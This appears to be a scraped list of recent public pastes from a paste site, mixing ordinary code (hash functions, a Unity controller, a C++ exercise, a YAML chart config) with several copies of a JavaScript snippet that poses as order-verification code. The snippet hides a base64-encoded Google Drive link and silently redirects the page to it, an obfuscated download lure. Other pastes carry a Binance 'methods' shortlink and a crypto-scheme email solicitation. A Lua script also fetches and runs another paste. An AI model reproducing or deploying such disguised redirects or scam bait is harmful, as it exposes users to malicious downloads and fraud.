iwUJs1pp,Binance account CW,TypicalGamer1227,JavaScript,Saturday 29th of March 2025 06:13:47 AM CDT," 
Pdf https://tinyurl.com/methodssss


9Xd0mITeg4
"
ZR2zNwbN,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 06:13:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/207/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fwYtTWWX,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 05:43:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/523/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZAGhkzEM,FORCELOGIN IRPG,ionut,mIRC,Saturday 29th of March 2025 05:26:27 AM CDT,"alias fl {
    if ($1 == $null) {
        echo -a Eroare: Trebuie să specifici un nick! Exemplu: /fl Gerard
        return
    }
    var %nick = $1
    var %whois = $whois(%nick)
    var %identHost = $remove($address(%nick, 5), *!)
    if (%identHost == $null) {
        echo -a Eroare: Nu pot obține adresa ident@host pentru nick-ul %nick.
        return
    }
    msg IRPG forcelogin %nick %nick %identHost
    echo -a Mesaj trimis către IRPG: forcelogin %nick %nick %identHost de la nick-ul %nick
}
"
XZsJfHJY,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 05:11:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/570/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7HKrVcDP,fnv1a,rgruber,JavaScript,Saturday 29th of March 2025 05:03:10 AM CDT,"function fnv1a(str) {
    let hash = 2166136261n; // FNV offset basis
    const prime = 16777619n; // FNV prime
    
    for (let i = 0; i < str.length; i++) {
        hash ^= BigInt(str.charCodeAt(i));
        hash *= prime;
    }
    
    // Convert to 32-bit unsigned integer
    return Number(hash & 0xffffffffn);
}

// Usage
const text = ""FNV-1a (Fowler-Noll-Vo) Hash"";
"
RNdzS84Y,murmurhash3_32,rgruber,JavaScript,Saturday 29th of March 2025 05:02:00 AM CDT,"function murmurhash3_32(key, seed = 0) {
    const c1 = 0xcc9e2d51;
    const c2 = 0x1b873593;
    const r1 = 15;
    const r2 = 13;
    const m = 5;
    const n = 0xe6546b64;

    let hash = seed;
    let len = key.length;
    
    const getUint32 = (str, pos) => {
        return (str.charCodeAt(pos) & 0xff) |
               ((str.charCodeAt(pos + 1) & 0xff) << 8) |
               ((str.charCodeAt(pos + 2) & 0xff) << 16) |
               ((str.charCodeAt(pos + 3) & 0xff) << 24);
    };

    let i = 0;
    while (i + 4 <= len) {
        let k = getUint32(key, i);
        k = Math.imul(k, c1);
        k = (k << r1) | (k >>> (32 - r1));
        k = Math.imul(k, c2);
        
        hash ^= k;
        hash = (hash << r2) | (hash >>> (32 - r2));
        hash = Math.imul(hash, m) + n;
        i += 4;
    }

    let remaining = len % 4;
    if (remaining > 0) {
        let k = 0;
        for (let j = 0; j < remaining; j++) {
            k |= (key.charCodeAt(i + j) & 0xff) << (j * 8);
        }
        k = Math.imul(k, c1);
        k = (k << r1) | (k >>> (32 - r1));
        k = Math.imul(k, c2);
        hash ^= k;
    }

    hash ^= len;
    hash ^= (hash >>> 16);
    hash = Math.imul(hash, 0x85ebca6b);
    hash ^= (hash >>> 13);
    hash = Math.imul(hash, 0xc2b2ae35);
    hash ^= (hash >>> 16);

    return hash >>> 0; // Ensure unsigned 32-bit
}

// Usage
const text = ""Hello World"";
console.log(murmurhash3_32(text)); // Outputs a number like 2951470589"
0h1iD6Y4,simpleHash,rgruber,JavaScript,Saturday 29th of March 2025 05:01:19 AM CDT,"function simpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = (hash << 5) - hash + str.charCodeAt(i);
        hash = hash >>> 0; // Convert to unsigned 32-bit
    }
    return hash;
}
"
mtM12RQ6,fastHash,rgruber,JavaScript,Saturday 29th of March 2025 05:00:20 AM CDT,"function fastHash(str, seed = 0) {
    const p1 = 2654435761 >>> 0; // Prime 1
    const p2 = 1597334677 >>> 0; // Prime 2
    const p3 = 2246822519 >>> 0; // Prime 3
    let h = seed + p1;

    let i = 0;
    const len = str.length;

    // Process 4 bytes at a time
    while (i + 4 <= len) {
        let k = (str.charCodeAt(i) & 0xff) |
                ((str.charCodeAt(i + 1) & 0xff) << 8) |
                ((str.charCodeAt(i + 2) & 0xff) << 16) |
                ((str.charCodeAt(i + 3) & 0xff) << 24);
        
        k = Math.imul(k, p2);
        h = Math.imul(h ^ (k >>> 16), p1);
        h = Math.imul(h ^ k, p3);
        i += 4;
    }

    // Handle remaining bytes
    while (i < len) {
        h ^= (str.charCodeAt(i) & 0xff);
        h = Math.imul(h, p1);
        i++;
    }

    // Finalization
    h ^= h >>> 13;
    h = Math.imul(h, p2);
    h ^= h >>> 16;

    return h >>> 0; // Ensure unsigned 32-bit
}

// Usage
const text = ""Hello World"";
console.log(fastHash(text)); // Outputs a number like 3894213542

// Test with multiple strings
const tests = [""Hello World"", ""Test String"", ""Another One""];
tests.forEach(str => {
    console.log(`${str}: ${fastHash(str)}`);
});"
hsiqx1G8,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 04:56:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/093/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UJBNub8E,Untitled,vpeter,Bash,Saturday 29th of March 2025 04:48:04 AM CDT,"diff --git a/scripts/create_addon b/scripts/create_addon
index a725842863..a2b56e556b 100755
--- a/scripts/create_addon
+++ b/scripts/create_addon
@@ -162,7 +162,7 @@ while [ $# -gt 0 ]; do
       usage 1
       ;;
     -*)
-      addons_drop+="" $(get_addons ${1:1})""
+      addons_drop+="" ${1:1}""
       ;;
     *)
       addons+="" $(get_addons ${1})""
"
SxjdJPL6,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 04:41:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/785/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B5VkbqZt,Creating,Nil000,Email,Saturday 29th of March 2025 04:13:53 AM CDT,"Creating your own cryptocurrency!
Email me at: bitcryptomann@gmail.com"
39AhQ1FM,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 04:10:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/491/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
F0GcPn3q,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 03:54:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/854/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
C05rDhCW,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 03:39:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/966/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ud5NxX0z,Emillio Yu-Gi-Oh! Game Deck Event crazy SQL table join blah... Version 2 optimized,TRToC,C#,Saturday 29th of March 2025 03:36:47 AM CDT,"var _joinedTables = from _dttFilter in _drFilter
                    join _dtDeck in _dsYgo.Tables[""Deck""].AsEnumerable()
                    on int.Parse(_dttFilter[""FK_Deck""].ToString()) 
                    equals int.Parse(_dtDeck[""PK_Deck""].ToString())

                    join _dtEvent in _dtEventsTemp.AsEnumerable()
                    on (_dttFilter[""FK_Event""].ToString() == """" ? -1 : int.Parse(_dttFilter[""FK_Event""].ToString())) 
                    equals int.Parse(_dtEvent[""PK_Event""].ToString())

                    let latestDeckList = _dsYgo.Tables[""DeckList""].AsEnumerable()
                        .Where(_drDeckList => _drDeckList[""FK_Deck""].ToString() == _dtDeck[""PK_Deck""].ToString() &&
                                              DateTime.Parse(_drDeckList[""Datum""].ToString()) < DateTime.Parse(_dttFilter[""Start""].ToString()))
                        .OrderByDescending(_drDeckList => DateTime.Parse(_drDeckList[""Datum""].ToString()))
                        .FirstOrDefault()
                    
                    select new
                    {
                        Start = _dttFilter[""Start""],
                        End = _dttFilter[""End""],
                        Deck = _dtDeck[""Name""],
                        Event = _dtEvent[""Name""],
                        CoinWin = _dttFilter[""CoinWin""],
                        Win = _dttFilter[""Win""],
                        FK_DeckList = latestDeckList != null ? latestDeckList[""PK_Decklist""].ToString() : """"
                    };
"
HwEhVSPQ,Entso-E apex electricity chart,RichardHA,YAML,Saturday 29th of March 2025 03:34:49 AM CDT,"type: custom:apexcharts-card
graph_span: 24h
update_interval: 5m
span:
  start: day
show:
  last_updated: true
  legend: false
now:
  show: true
  label: Now
  color: yellow
header:
  show: true
  title: Electriciteitsprijzen Vandaag (€/kwh)
  show_states: true
  colorize_states: true
yaxis:
  - id: Prijs
    decimals: 2
experimental:
  color_threshold: true
  disable_config_validation: true
series:
  - entity: sensor.entso_e_average_electricity_price
    show:
      datalabels: false
      extremas: true
      in_header: before_now
    name: Energy Price net
    stroke_width: 0
    float_precision: 3
    type: column
    opacity: 0.7
    color: yellow
    data_generator: |
      return entity.attributes.prices.map((entry) => { 
      return [new Date(entry.time), entry.price];
      });
  - entity: sensor.entso_e_average_electricity_price
    name: Energy Price incl costs
    show:
      datalabels: false
      extremas: true
      in_header: before_now
    stroke_width: 0
    float_precision: 3
    type: column
    opacity: 0.7
    color_threshold:
      - value: 0
        color: lightblue
      - value: 0.15
        color: lightgreen
      - value: 0.2
        color: darkgreen
      - value: 0.3
        color: orange
      - value: 0.35
        color: red
    data_generator: |
      return entity.attributes.prices.map((entry) => { 
      return [new Date(entry.time), (entry.price + 0.10880 +0.02481)*1.21];
      }); 
"
MeK6vMsF,Order.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 03:24:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/933/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5YsxFukw,PlayerMovement,leomovskii,C#,Saturday 29th of March 2025 03:15:36 AM CDT,"using System.Linq;
using UnityEngine;

public class PlayerMovement : MonoBehaviour {

	public float speed;
	public float jumpHeight;
	public float gravity = 20f;

	[Space]

	public Transform cameraTransform;
	public float horizontalSensitivity = 1f;
	public float verticalSensitivity = 1f;
	public float pitchMin = -70f;
	public float pitchMax = 80f;

	[Space]

	public float _fallY = -20f;

	private CharacterController _controller;
	private Vector3 _input;
	private Vector3 _verticalVelocity;
	private Vector3 _yawVector;
	private Vector3 _currentPitch;

	private void Start() {
		Cursor.lockState = CursorLockMode.Locked;
		Cursor.visible = false;

		_controller = GetComponent<CharacterController>();
		_currentPitch = cameraTransform.localEulerAngles;
	}

	private void Update() {
		if (transform.position.y < _fallY) {
			var points = FindObjectsOfType<RespawnPoint>();
			if (points.Length > 0) {
				var nearest = points.OrderBy(respawn => Vector3.Distance(transform.position, respawn.transform.position)).FirstOrDefault();
				_controller.enabled = false;
				transform.SetPositionAndRotation(nearest.transform.position, nearest.transform.rotation);
				_controller.enabled = true;
				_verticalVelocity.y = 0f;

			} else {
				Debug.LogError(""No respawns found"");
			}
		}

		MoveUpdate();
		LookUpdate();
	}

	private void MoveUpdate() {
		bool isGrounded = _controller.isGrounded;

		_input.x = Input.GetAxisRaw(""Horizontal"");
		_input.z = Input.GetAxisRaw(""Vertical"");
		_input.Normalize();

		if (_verticalVelocity.y < -2f && isGrounded)
			_verticalVelocity.y = -1f;

		Vector3 moveVector = transform.forward * _input.z + transform.right * _input.x;
		_controller.Move(speed * Time.deltaTime * moveVector);

		if (Input.GetKeyDown(KeyCode.Space) && isGrounded) {
			_verticalVelocity.y = Mathf.Sqrt(jumpHeight * 2f * gravity);
		}

		_verticalVelocity.y -= gravity * Time.deltaTime;
		_controller.Move(_verticalVelocity * Time.deltaTime);
	}

	private void LookUpdate() {
		_yawVector.y = Input.GetAxis(""Mouse X"") * horizontalSensitivity;
		float pitch = Input.GetAxis(""Mouse Y"") * verticalSensitivity;

		transform.Rotate(_yawVector);

		_currentPitch.x = Mathf.Clamp(_currentPitch.x - pitch, pitchMin, pitchMax);
		cameraTransform.localEulerAngles = _currentPitch;
	}
}"
jL7qPETF,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 03:08:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/754/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4WmVQCrs,简化护盾制导,jaklsfjlsak,Lua,Saturday 29th of March 2025 03:02:18 AM CDT,"local OffsetValue = 0
local shield = peripheral.find(""warpdriveForceFieldProjector"")
local lasers = peripheral.getNames()
local lever = ""front""
local lastLx, lastLy, lastLz = 0, 0, 0

function shieldOffset(lx, ly, lz, fx, fy, fz)
    local dx = lx - fx
    local dy = ly - fy
    local dz = lz - fz
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    dx = dx / distance
    dy = dy / distance
    dz = dz / distance
    local t1x = lx + dx * OffsetValue
    local t1y = ly + dy * OffsetValue
    local t1z = lz + dz * OffsetValue
    return t1x, t1y, t1z, distance
end

if fs.exists(""conf"") == false then
    shell.run(""pastebin get 38M5cNbZ conf"")
    term.clear()
end

for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

print(""Control System Online, Toggle Redstone To Toggle Shields, Press C to Configure"")

local _, upgrades = shield.getUpgrades()
local Size
if upgrades:match(""1/4 x Range"") then
    Size = 16
elseif upgrades:match(""2/4 x Range"") then
    Size = 32
elseif upgrades:match(""3/4 x Range"") then
    Size = 48
elseif upgrades:match(""4/4 x Range"") then
    Size = 64
elseif upgrades:match(""0/4 x Range"") then
    Size = 0
end

while true do
    local event, laserName, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()

    if event == ""laserScanning"" then
        lastLx, lastLy, lastLz = tonumber(lx), tonumber(ly), tonumber(lz)
        local fx, fy, fz = shield.getLocalPosition()
        local t1x, t1y, t1z, distance = shieldOffset(lastLx, lastLy, lastLz, fx, fy, fz)

        tx = (t1x - fx) / Size
        ty = (t1y - fy) / Size
        tz = (t1z - fz) / Size

        
            shield.translation(tx, ty, tz)

    elseif event == ""redstone"" then
        local fx, fy, fz = shield.getLocalPosition()
        local _, _, _, distance = shieldOffset(lastLx, lastLy, lastLz, fx, fy, fz)
        local on = redstone.getAnalogInput(lever)
        if on > 6 then
            shield.enable(true)
        elseif on < 5 then
            shield.enable(false)
        end
    elseif event == ""key"" and laserName == 46 then
        print(""C key pressed, running 'conf' script..."")
        shell.run(""conf"")
    end
end
"
GL2zyN5K,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 02:53:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/138/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vgL4E8NH,D. Дождевая вода,Korotkodul,C++,Saturday 29th of March 2025 02:47:41 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

void cv(vector <int> v) {
    for (int el: v) {
        cout << el << ' ';
    } cout << ""\n"";
}

int n;
vector <int> a;

int l(int R) {
    cout << ""R: "" << R <<""\n"";
    if  (R == 0 || R == n - 1){
        return 0;
    }
    auto max_it = max_element(a.begin(), a.begin() +  R - 1);
    int mxi = R - (abs(distance(a.begin() + R, max_it)));
    cout << ""mxi: "" << mxi << ""\n"";
    cout << ""dst: "" << abs(distance(a.begin() + R, max_it)) << ""\n"";
    int s = 0;
    int h = a[mxi];
    cout << ""h: "" << h << ""\n"";
    for (int i = R - 1; i >= mxi; --i) {
        if (h < a[i]) {
            continue;
        }
        cout << ""i: "" << i << ""\n"";
        s += h - a[i];
    }
    cout << ""s: "" << s << ""\n"";
    cout << ""\n"";
    int add = l(mxi);
    return s + add;
}

int r(int L) {
    cout << ""L: "" << L << ""\n"";
    if (L == n - 1 || L == 0) {
        return 0;
    }
    auto max_it = max_element(a.begin() + L + 1, a.end());
    int mxi = L + abs(distance(a.begin() + L, max_it));
    cout << ""mxi: "" << mxi << ""\n"";
    cout << ""dst: "" << abs(distance(a.begin() + L, max_it)) << ""\n"";
    int s = 0;
    int h = a[mxi];
    cout << ""h: "" << h << ""\n"";
    for (int i = L + 1; i <= mxi; ++i) {
        if (h < a[i]) {
            continue;
        }
        cout << ""i: "" << i << ""\n"";
        s += h - a[i];
    }
    cout << ""s: "" << s << ""\n"";
    cout << ""\n"";
    int add = r(mxi);
    return s + add;
}
/*
10
7 0 4 2 5 0 6 4 0 5

16
1 2 4 0 0 5 4 2 6 8 2 3 4 5 5 3
*/
int main() {
     cin >> n;
    a.resize(n);
    for (int &el: a) cin >> el;
    auto max_it = max_element(a.begin(), a.end());
    int mxi = distance(a.begin(), max_it);
    int s = l(mxi) + r(mxi);
    cout << s << ""\n"";
}

"
d1C9vENC,"Power Tool [V2.1, FE]",iiJosephCats205,Lua,Saturday 29th of March 2025 02:30:43 AM CDT,"--https://github.com/Mokiros/roblox-FE-compatibility
if game:GetService(""RunService""):IsClient() then error(""Script must be server-side in order to work; use h/ and not hl/"") end
local Player,game,owner = owner,game
local RealPlayer = Player
do
	print(""FE Compatibility code V2 by Mokiros"")
	local RealPlayer = RealPlayer
	script.Parent = RealPlayer.Character

	--Fake event to make stuff like Mouse.KeyDown work
	local Disconnect_Function = function(this)
		this[1].Functions[this[2]] = nil
	end
	local Disconnect_Metatable = {__index={disconnect=Disconnect_Function,Disconnect=Disconnect_Function}}
	local FakeEvent_Metatable = {__index={
		Connect = function(this,f)
			local i = tostring(math.random(0,10000))
			while this.Functions[i] do
				i = tostring(math.random(0,10000))
			end
			this.Functions[i] = f
			return setmetatable({this,i},Disconnect_Metatable)
		end
	}}
	FakeEvent_Metatable.__index.connect = FakeEvent_Metatable.__index.Connect
	local function fakeEvent()
		return setmetatable({Functions={}},FakeEvent_Metatable)
	end

	--Creating fake input objects with fake variables
	local FakeMouse = {Hit=CFrame.new(),KeyUp=fakeEvent(),KeyDown=fakeEvent(),Button1Up=fakeEvent(),Button1Down=fakeEvent(),Button2Up=fakeEvent(),Button2Down=fakeEvent()}
	FakeMouse.keyUp = FakeMouse.KeyUp
	FakeMouse.keyDown = FakeMouse.KeyDown
	local UIS = {InputBegan=fakeEvent(),InputEnded=fakeEvent()}
	local CAS = {Actions={},BindAction=function(self,name,fun,touch,...)
		CAS.Actions[name] = fun and {Name=name,Function=fun,Keys={...}} or nil
	end}
	--Merged 2 functions into one by checking amount of arguments
	CAS.UnbindAction = CAS.BindAction

	--This function will trigger the events that have been :Connect()'ed
	local function TriggerEvent(self,ev,...)
		for _,f in pairs(self[ev].Functions) do
			f(...)
		end
	end
	FakeMouse.TriggerEvent = TriggerEvent
	UIS.TriggerEvent = TriggerEvent

	--Client communication
	local Event = Instance.new(""RemoteEvent"")
	Event.Name = ""UserInput_Event""
	Event.OnServerEvent:Connect(function(plr,io)
